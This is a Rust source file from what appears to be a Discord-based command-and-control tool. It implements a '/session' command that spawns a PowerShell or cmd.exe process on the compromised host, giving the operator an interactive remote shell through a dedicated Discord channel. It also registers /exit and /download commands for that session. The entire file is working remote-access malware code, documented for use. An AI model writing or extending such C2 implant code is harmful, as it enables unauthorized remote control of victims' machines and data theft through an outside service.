use crate::{
    commands::{shell::exit, SHELL_TYPE},
    errors::DiscordC2Error,
    event_handler::ephemeral_interaction_create,
    os::process_handler::{ProcessHandler, ShellType},
    utils::{agent::get_or_create_agent, channels::create_text_channel},
};

use serenity::{
    builder::CreateApplicationCommand,
    model::{application::{command::{Command, CommandOptionType}, interaction::application_command::{CommandDataOption, CommandDataOptionValue, ApplicationCommandInteraction}}},
    client::Context,
};
use chrono::Utc;
use crate::commands::shell::download;

/// Registers the "session" application command with the provided `CreateApplicationCommand` builder. This command
/// allows users to open an interactive command session with the agent, using either PowerShell or CMD.
///
/// # Arguments
///
/// * `command` - The `CreateApplicationCommand` builder to use for registering the command.
///
/// # Returns
///
/// A mutable reference to the provided `CreateApplicationCommand` builder, with the "session" command added.
///
/// # Example
///
/// ```
/// use serenity::builder::CreateApplicationCommand;
///
/// let mut command = CreateApplicationCommand::default();
/// register(&mut command);
/// ```
///
/// This function creates an option for the "session" command, which allows users to specify the type of session
/// they want to open (either "powershell.exe" or "cmd.exe"). This option is required.
///
/// Note that this function does not actually register the command with Discord. To do that, you must call the
/// `http.create_global_application_command` method on a `Http` client object.
pub fn register(command: &mut CreateApplicationCommand) -> &mut CreateApplicationCommand {
    // Register the session command
    command
        .name("session")
        .description("Open up an interactive command session with the agent.")
        .create_option(
            |option| {
                option.name("session-type")
                    .kind(CommandOptionType::String)
                    .description("The type of interactive session to open.")
                    .add_string_choice("powershell.exe", "powershell")
                    .add_string_choice("cmd.exe", "cmd")
                    .required(true)
            }
        )
}

/// Creates a new interactive command session with the agent, and returns a message indicating that the session
/// has been created. The session channel is created with a unique name and topic, and the "/exit" command is
/// registered within the channel to allow users to exit the session.
///
/// # Arguments
///
/// * `ctx` - The context object for the current bot session.
/// * `options` - An array of `CommandDataOption` objects containing the user's command options.
///
/// # Returns
///
/// A tuple containing a message indicating that the session has been created, and an optional `ShellType` object
/// specifying the type of shell to use for the session (if specified by the user).
///
/// # Errors
///
/// This function can return a `DiscordC2Error` if an error occurs during channel creation, command registration,
/// or shell process initialization.
///
/// # Example
///
/// ```
/// use serenity::model::interactions::{ApplicationCommandInteraction, CommandDataOption};
/// use serenity::client::Context;
///
/// async fn handle_interaction(ctx: &Context, command: ApplicationCommandInteraction, options: &[CommandDataOption]) {
///     let (content, shell) = run(ctx, options).await.expect("Failed to create session channel");
///     command.reply(&ctx.http, content).await.expect("Failed to send message");
/// }
/// ```
///
/// This function uses the `get_or_create_agent` function to retrieve the current bot agent, and creates a new
/// channel using the `create_text_channel` function. It then sets the agent's session channel attribute to the
/// new channel, and registers the "/exit" command within the channel. Finally, it initializes a shell process
/// based on the user's selected shell type (if specified).
///
/// Note that this function assumes that the `get_or_create_agent` function has already been called and the agent
/// has been initialized.
pub async fn run(ctx: &Context, options: &[CommandDataOption]) -> Result<(String, Option<ShellType>), DiscordC2Error> {
    let mut agent = get_or_create_agent(ctx).await;
    let now = Utc::now().format("%m-%d-%Y┇%H︰%M︰%S╏UTC").to_string(); //TODO: Cleanup this date format

    // Grab the session type from options
    let option = options
        .get(0)
        .ok_or_else(|| DiscordC2Error::DiscordError(String::from("Expected a resolved option")))?
        .resolved
        .as_ref().ok_or_else(|| DiscordC2Error::DiscordError(String::from("Expected a resolved option")))?;


    // Create a channel for the remote session, and set the name/topic appropriately
    let session_channel = create_text_channel(ctx, &now, agent.get_category_channel(), "This is a unique and interactive command session created with your agent. Normal commands will not work here.").await?;
    agent.set_session_channel(Some(session_channel))?; // Update the agent's session channel attribute (this also updates the JSON configuration).

    let string = format!(
        "Successfully created command session channel at <#{}>",
        session_channel
    );

    Command::create_global_application_command(&ctx.http, exit::register).await?; // Create the /exit command
    Command::create_global_application_command(&ctx.http, download::register).await?;

    if let CommandDataOptionValue::String(shell_type) = option {
        let (content, shell) = match shell_type.as_str() {
            "powershell" => {
                ProcessHandler::instance(&ShellType::Powershell).await?;
                (string, ShellType::Powershell)
            }
            "cmd" => {
                ProcessHandler::instance(&ShellType::Cmd).await?;
                (string, ShellType::Cmd)
            }
            _ => return Err(DiscordC2Error::InvalidShellType)
        };
        Ok((content.parse().unwrap(), Option::from(shell))) //Return the success message and the shell type wrapped with an Option
    } else {
        Ok(("No options were specified.".to_string(), None))
    }
}

/// Handles the "session" application command, which opens a new interactive command session with the agent
/// using either PowerShell or CMD. This function delegates most of its work to the `session::run` function,
/// which creates the new session and returns a message indicating that it has been created.
///
/// # Arguments
///
/// * `ctx` - The context object for the current bot session.
/// * `command` - The interaction object representing the user's "session" command.
///
/// # Returns
///
/// This function returns `Ok(())` if the session is created successfully, or a `DiscordC2Error` if an error
/// occurs during session creation.
///
/// # Example
///
/// ```
/// use serenity::model::interactions::ApplicationCommandInteraction;
/// use serenity::client::Context;
///
/// async fn handle_interaction(ctx: &Context, command: ApplicationCommandInteraction) {
///     handle_session(ctx, &command).await.expect("Failed to handle session");
/// }
/// ```
///
/// This function simply calls the `session::run` function to create the new session, and then sends the
/// resulting message back to the user using the `ephemeral_interaction_create` function. If the session is
/// created successfully, the function stores the session's `ShellType` in a global variable for later use.
///
/// Note that this function assumes that the `get_or_create_agent` function has already been called and the
/// agent has been initialized. It also assumes that the `session::run` function returns a message string
/// followed by an optional `ShellType` object.
pub async fn session_handler(ctx: &Context, command: &ApplicationCommandInteraction) -> Result<(), DiscordC2Error> {
    let (content, shell) = run(ctx, &command.data.options).await?;
    ephemeral_interaction_create(ctx, command, &content).await?;

    let shell_type = shell.ok_or(DiscordC2Error::AgentError("Shell was not properly created".parse().unwrap()))?;

    // Store shell_type in the global variable
    *SHELL_TYPE.lock().await = Some(shell_type);
    println!("Shell Type in handle_session: {:?}", shell_type);
    Ok(())
}
